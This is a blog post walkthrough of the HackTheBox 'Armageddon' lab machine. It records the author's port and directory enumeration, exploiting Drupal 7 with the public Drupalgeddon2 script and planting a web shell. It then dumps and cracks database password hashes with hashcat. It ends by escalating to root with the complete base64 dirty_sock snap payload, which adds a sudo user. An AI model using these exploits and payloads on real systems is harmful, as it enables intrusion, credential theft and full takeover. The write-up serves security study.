<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>HackTheBox: Armageddon :: Yet, another infosec blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="This is another challenge on HackTheBox - Armageddon. Let&amp;rsquo;s get started.
Enumeration Nmap We start by enumerating open ports and services on the target machine using nmap:
┌──(root💀kali)-[/home/kali/HackTheBox/Armageddon] └─# cat nmap/armageddon.nmap # Nmap 7.91 scan initiated Thu May 27 00:25:58 2021 as: nmap -sS -sC -sV -p- -oA nmap/armageddon -v 10.10.10.233 Nmap scan report for 10.10.10.233 Host is up (0.23s latency). Not shown: 65219 closed ports, 314 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7." />
<meta name="keywords" content="infosec, pwn, ctf, challenges, hackthebox, reverse" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://legiahuyy.github.io/blog/en/posts/htb-armageddon/" />




<link rel="stylesheet" href="https://legiahuyy.github.io/blog/en/assets/style.css">

  <link rel="stylesheet" href="https://legiahuyy.github.io/blog/en/assets/green.css">






<link rel="apple-touch-icon" href="https://legiahuyy.github.io/blog/en/img/apple-touch-icon-192x192.png">

  <link rel="shortcut icon" href="https://legiahuyy.github.io/blog/en/img/favicon/green.png">



<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="" />
  
    <meta name="twitter:creator" content="The Archivist" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="HackTheBox: Armageddon">
<meta property="og:description" content="This is another challenge on HackTheBox - Armageddon. Let&amp;rsquo;s get started.
Enumeration Nmap We start by enumerating open ports and services on the target machine using nmap:
┌──(root💀kali)-[/home/kali/HackTheBox/Armageddon] └─# cat nmap/armageddon.nmap # Nmap 7.91 scan initiated Thu May 27 00:25:58 2021 as: nmap -sS -sC -sV -p- -oA nmap/armageddon -v 10.10.10.233 Nmap scan report for 10.10.10.233 Host is up (0.23s latency). Not shown: 65219 closed ports, 314 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7." />
<meta property="og:url" content="https://legiahuyy.github.io/blog/en/posts/htb-armageddon/" />
<meta property="og:site_name" content="Yet, another infosec blog" />

  
    <meta property="og:image" content="https://legiahuyy.github.io/blog/en/img/favicon/green.png">
  

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

  <meta property="article:section" content="hackthebox" />


  <meta property="article:published_time" content="2021-05-28 09:30:00 &#43;1345 &#43;1345" />












</head>
<body class="green">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/blog/en/">
  <div class="logo">
    <style>
      .blink {
        animation: blinker 1s linear infinite;
        color: red!important;
}
.logo_anchor
{
  color: blue!important;
}

@keyframes blinker {
  50% {
    opacity: 0;
  }
}
    </style>
    <div class="logo_anchor">
      ./&ThinSpace; 
    </div>
      Archivist
    <div class="blink"> # </div> 
  </div>
</a>

    </div>
    
      <div class="menu-trigger">menu</div>
    
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/blog/en/posts">1.Posts</a></li>
        
      
        
          <li><a href="/blog/en/categories">2.Categories</a></li>
        
      
        
          <li><a href="/blog/en/tags">3.Tags</a></li>
        
      
        
          <li><a href="/blog/en/about">4.About</a></li>
        
      
      
        <ul class="menu__sub-inner">
          <li class="menu__sub-inner-more-trigger">More ▾</li>

          <ul class="menu__sub-inner-more hidden">
            
              
                <li><a href="/blog/en/sitemap.xml">RSS</a></li>
              
            
              
                <li><a href="https://buymeacoffee.com/7Bkc3SH">Support</a></li>
              
            
          </ul>
        </ul>
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/blog/en/posts">1.Posts</a></li>
      
    
      
        <li><a href="/blog/en/categories">2.Categories</a></li>
      
    
      
        <li><a href="/blog/en/tags">3.Tags</a></li>
      
    
      
        <li><a href="/blog/en/about">4.About</a></li>
      
    
      
        <li><a href="/blog/en/sitemap.xml">RSS</a></li>
      
    
      
        <li><a href="https://buymeacoffee.com/7Bkc3SH">Support</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="https://legiahuyy.github.io/blog/en/posts/htb-armageddon/">HackTheBox: Armageddon</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2021-05-28
        
      </span>
    
    
      <span class="post-author">:: The Archivist</span>
    
    
  </div>

  
  <span class="post-tags">
    
    #<a href="https://legiahuyy.github.io/blog/en/tags/hackthebox/">hackthebox</a>&nbsp;
    
    #<a href="https://legiahuyy.github.io/blog/en/tags/network/">network</a>&nbsp;
    
    #<a href="https://legiahuyy.github.io/blog/en/tags/pwn/">pwn</a>&nbsp;
    
  </span>
  
  


  

  <div class="post-content"><div>
        <p>This is another challenge on HackTheBox - Armageddon. Let&rsquo;s get started.</p>
<h2 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h3 id="nmap">Nmap<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>We start by enumerating open ports and services on the target machine using <code>nmap</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>root💀kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/kali/HackTheBox/Armageddon<span style="color:#f92672">]</span>
└─# cat nmap/armageddon.nmap 
<span style="color:#75715e"># Nmap 7.91 scan initiated Thu May 27 00:25:58 2021 as: nmap -sS -sC -sV -p- -oA nmap/armageddon -v 10.10.10.233</span>
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.233
Host is up <span style="color:#f92672">(</span>0.23s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">65219</span> closed ports, <span style="color:#ae81ff">314</span> filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">2048</span> 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp open  http    Apache httpd 2.4.6 <span style="color:#f92672">((</span>CentOS<span style="color:#f92672">)</span> PHP/5.4.16<span style="color:#f92672">)</span>
|_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D
|_http-generator: Drupal <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>http://drupal.org<span style="color:#f92672">)</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: <span style="color:#ae81ff">36</span> disallowed entries <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> shown<span style="color:#f92672">)</span>
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 <span style="color:#f92672">(</span>CentOS<span style="color:#f92672">)</span> PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#75715e"># Nmap done at Thu May 27 01:24:56 2021 -- 1 IP address (1 host up) scanned in 3538.09 seconds</span>
</code></pre></div><p>There are two open ports which are SSH on <code>22</code> and Apache web server on <code>80</code>. The OpenSSH is usually not exploitable so we should focus on its web server.</p>
<p>The homepage includes a login form and allows us to create new accounts but it seems to be not working as the new account needs to get approval from the administrator. Also, the request new password feature is only available for existing users.</p>
<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-12.png" alt=""></p>
<h3 id="gobuster">GoBuster<a href="#gobuster" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>I decide to use <code>gobuster</code> to try finding more accessible objects on the web server. These results are most likely to give us a hint about what we have to do next.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>root💀kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/kali/HackTheBox/Armageddon<span style="color:#f92672">]</span>
└─# gobuster dir -q -u http://10.10.10.233/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak -t <span style="color:#ae81ff">50</span> -o gobuster.txt
/index.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 7440<span style="color:#f92672">]</span>
/misc                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 233<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.233/misc/<span style="color:#f92672">]</span>
/themes               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 235<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.233/themes/<span style="color:#f92672">]</span>
/modules              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 236<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.233/modules/<span style="color:#f92672">]</span>
/scripts              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 236<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.233/scripts/<span style="color:#f92672">]</span>
/sites                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 234<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.233/sites/<span style="color:#f92672">]</span>  
/includes             <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 237<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.233/includes/<span style="color:#f92672">]</span>
/install.php          <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3172<span style="color:#f92672">]</span>                                   
/profiles             <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 237<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.233/profiles/<span style="color:#f92672">]</span>
/update.php           <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 4057<span style="color:#f92672">]</span>                                   
/README.txt           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 5382<span style="color:#f92672">]</span>                                   
/robots.txt           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 2189<span style="color:#f92672">]</span>                                   
/cron.php             <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 7388<span style="color:#f92672">]</span>                                   
/INSTALL.txt          <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 17995<span style="color:#f92672">]</span>                                  
/LICENSE.txt          <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 18092<span style="color:#f92672">]</span>                                  
/CHANGELOG.txt        <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 111613<span style="color:#f92672">]</span>                                 
/xmlrpc.php           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 42<span style="color:#f92672">]</span>                                     
/COPYRIGHT.txt        <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1481<span style="color:#f92672">]</span>  
...
</code></pre></div><h2 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>After some glances through all the folders and files, I bump into some information about <em>Drupal</em>.</p>
<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-13.png" alt=""></p>
<p>As in the <code>README.txt</code> and <a href="https://www.drupal.org/">their website</a>, Drupal is simply an open-source CMS platform. This revealed Drupal to be our exploit target but we have to know about the version of Drupal the machine is using.</p>
<p>And we can get it by reading <code>Changelog.txt</code>:</p>
<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-14.png" alt=""></p>
<p>So the version is 7.56, while searching on Google about its vulnerability, I found this <a href="https://github.com/dreadlocked/Drupalgeddon2">Github repo</a> would provide us a handy boost.</p>
<h3 id="reverse-shell-with-drupalgeddon2">Reverse shell with Drupalgeddon2<a href="#reverse-shell-with-drupalgeddon2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-15.png" alt=""></p>
<p>Some brief information about CVE-2018-7600/SA-CORE-2018-002 and you can learn more about it <a href="https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/">here</a>.</p>
<blockquote>
<p>To provide some background, Drupal’s Form API was introduced in Drupal 6 and allowed alteration of the form data during the form rendering process. This revolutionized the way markup processing was done.</p>
<p>In Drupal 7 the Form API was generalized to what is now known as <em>Renderable Arrays</em>. This extended API is used to represent the structure of most of the UI elements in Drupal, such as pages, blocks, nodes and more.</p>
</blockquote>
<p>Basically it tampers malfunctioned data into the form and abuses the rendering markup process to achieve RCE.</p>
<p>That&rsquo;s all about the concept and definition, let&rsquo;s just use the automated script to exploit the target machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ruby drupalgeddon2.rb 10.10.10.233  
</code></pre></div><p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-18.png" alt=""></p>
<p>And we get our RCE endpoint at <code>http://armageddon.htb/shell.php?c=&lt;command&gt;</code>. Since the shell from Drupalgeddon2 is not flexible so I upload another one that includes a superb UI - <a href="https://github.com/flozz/p0wny-shell">p0wny-shell</a>.</p>
<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-27_14-05.png" alt=""></p>
<h3 id="getting-user-level-credentials-via-mysql">Getting user-level credentials via MySQL<a href="#getting-user-level-credentials-via-mysql" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>Inspecting <code>./sites/default/settings.php</code> gives us our credential for the MySQL database running on the machine&rsquo;s local host.</p>
<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-21.png" alt=""></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$databases <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span> (
  <span style="color:#e6db74">&#39;default&#39;</span> <span style="color:#f92672">=&gt;</span>
  <span style="color:#66d9ef">array</span> (
    <span style="color:#e6db74">&#39;default&#39;</span> <span style="color:#f92672">=&gt;</span>
    <span style="color:#66d9ef">array</span> (
      <span style="color:#e6db74">&#39;database&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;drupal&#39;</span>,
      <span style="color:#e6db74">&#39;username&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;drupaluser&#39;</span>,
      <span style="color:#e6db74">&#39;password&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;CQHEy@9M*m23gBVj&#39;</span>,
      <span style="color:#e6db74">&#39;host&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;localhost&#39;</span>,
      <span style="color:#e6db74">&#39;port&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;&#39;</span>,
      <span style="color:#e6db74">&#39;driver&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;mysql&#39;</span>,
      <span style="color:#e6db74">&#39;prefix&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;&#39;</span>,
    ),
  ),
);
</code></pre></div><p>Using above credentials to list all tables in the <code>drupal</code> database and <code>users</code> is the most conspicuous one here.</p>
<p>Let&rsquo;s dump all data in the <code>users</code> table with following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ mysql --user<span style="color:#f92672">=</span>drupaluser --password<span style="color:#f92672">=</span>CQHEy@9M*m23gBVj -D drupal -e <span style="color:#e6db74">&#39;select name,pass from users;&#39;</span>
</code></pre></div><p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-22.png" alt=""></p>
<p>And we have it as <code>brucetherealadmin	$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt</code>.</p>
<p>Next we want to use <code>hashid</code> to identify the hash type then pass it to <code>hashcat</code> to crack it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox/Armageddon<span style="color:#f92672">]</span>
└─$ echo -n <span style="color:#e6db74">&#39;$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt&#39;</span> | sudo tee brucetherealadmin.hash
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt                   
┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox/Armageddon<span style="color:#f92672">]</span>
└─$ hashid brucetherealadmin.hash

--File <span style="color:#e6db74">&#39;brucetherealadmin.hash&#39;</span>--
Analyzing <span style="color:#e6db74">&#39;$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt&#39;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Drupal &gt; v7.x 
--End of file <span style="color:#e6db74">&#39;brucetherealadmin.hash&#39;</span>--                                                                          
┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox/Armageddon<span style="color:#f92672">]</span>
└─$ sudo hashcat -a <span style="color:#ae81ff">3</span> -m <span style="color:#ae81ff">7900</span> brucetherealadmin.hash /usr/share/wordlists/rockyou.txt  
</code></pre></div><p>Finally, we acquired the password <code>brucetherealadmin:booboo</code></p>
<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-24.png" alt=""></p>
<h2 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>We are now able to ssh into 10.10.10.233 using the newly obtained credentials and grab our user flag. I also tried login as <code>brucetherealadmin</code> on the webpage but found nothing that worth attention.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">[</span>brucetherealadmin@armageddon ~<span style="color:#f92672">]</span>$ ls
user.txt
<span style="color:#f92672">[</span>brucetherealadmin@armageddon ~<span style="color:#f92672">]</span>$ cat user.txt 
9583f911b01bfc2c80d1216707XXXXXX
<span style="color:#f92672">[</span>brucetherealadmin@armageddon ~<span style="color:#f92672">]</span>$ 
</code></pre></div><p>In this escalation phase, first we need to know what <code>brucetherealadmin</code> can do.</p>
<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-25.png" alt=""></p>
<p>We are able to run <code>/usr/bin/snap install *</code> as superuser. We also have snap&rsquo;s version as following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">[</span>brucetherealadmin@armageddon ~<span style="color:#f92672">]</span>$ snap version
snap    2.47.1-1.el7
snapd   2.47.1-1.el7
series  <span style="color:#ae81ff">16</span>
centos  <span style="color:#ae81ff">7</span>
kernel  3.10.0-1160.6.1.el7.x86_64
</code></pre></div><p>After a quick search about <em>snapcraft</em>, <a href="https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html">this</a> will help us exploit and do a privesc. They also have a TL;DR for us to understand the vulnerability.</p>
<blockquote>
<p>snapd serves up a REST API attached to a local UNIX_AF socket. Access control to restricted API functions is accomplished by querying the UID associated with any connections made to that socket. User-controlled socket peer data can be affected to overwrite a UID variable during string parsing in a for-loop. This allows any user to access any API function</p>
</blockquote>
<p>Describe in basic terms, snapd service allows attacker to add a new user with sudo privilege, in this case is <code>dirty_sock:dirty_sock</code>, by installing our malicious <code>.snap</code> package.</p>
<p>Let&rsquo;s reproduce the PoC code as below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python3 -c <span style="color:#e6db74">&#34;print((&#39;&#39;&#39;                                                                    130 ⨯
</span><span style="color:#e6db74">aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
</span><span style="color:#e6db74">/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
</span><span style="color:#e6db74">ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
</span><span style="color:#e6db74">TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
</span><span style="color:#e6db74">T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
</span><span style="color:#e6db74">Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
</span><span style="color:#e6db74">ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
</span><span style="color:#e6db74">ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
</span><span style="color:#e6db74">L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
</span><span style="color:#e6db74">b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
</span><span style="color:#e6db74">rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
</span><span style="color:#e6db74">rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
</span><span style="color:#e6db74">AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
</span><span style="color:#e6db74">XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
</span><span style="color:#e6db74">RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
</span><span style="color:#e6db74">AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&#39;&#39;&#39;
</span><span style="color:#e6db74">               + &#39;A&#39; * 4256 + &#39;==&#39;))&#34;</span> | base64 -d | tee poc.snap

$ sudo snap install poc.snap
</code></pre></div><p>Run the code then do a check in <code>/etc/passwd</code> to see whether our exploit works.</p>
<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-29.png" alt=""></p>
<p>Switch to <code>dirty_sock</code> with <code>dirty_sock</code> as password and spawn our root shell then achieve the machine flag.</p>
<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-30.png" alt=""></p>

      </div></div>

  
  
<div class="pagination">
    <div class="pagination__title">
        <span class="pagination__title-h">Read other posts</span>
        <hr />
    </div>
    <div class="pagination__buttons">
        
        <span class="button previous">
            <a href="https://legiahuyy.github.io/blog/en/posts/update-note/">
                <span class="button__icon">←</span>
                <span class="button__text">Update.txt</span>
            </a>
        </span>
        
        
        <span class="button next">
            <a href="https://legiahuyy.github.io/blog/en/posts/ez-bof/">
                <span class="button__text">KCSC: A simple BOF</span>
                <span class="button__icon">→</span>
            </a>
        </span>
        
    </div>
</div>

  

  

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">
        <span>© 2022 The Archivist</a>.</span>
    
        <span>All posts are licensed under <a href="https://creativecommons.org/licenses/by/4.0/legalcode">CC BY 4.0</a>.</span>
      </div>
  </div>
</footer>

<script src="https://legiahuyy.github.io/blog/en/assets/main.js"></script>
<script src="https://legiahuyy.github.io/blog/en/assets/prism.js"></script>





<script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>


<script>
const images = Array.from(document.querySelectorAll(".post-content img"));
images.forEach(img => {
  mediumZoom(img, {
    margin: 0,  
    background: '#222129',
    scrollOffset: 40,  
    container: null,  
    template: null  
  });
});
</script>


  
</div>

</body>
</html>
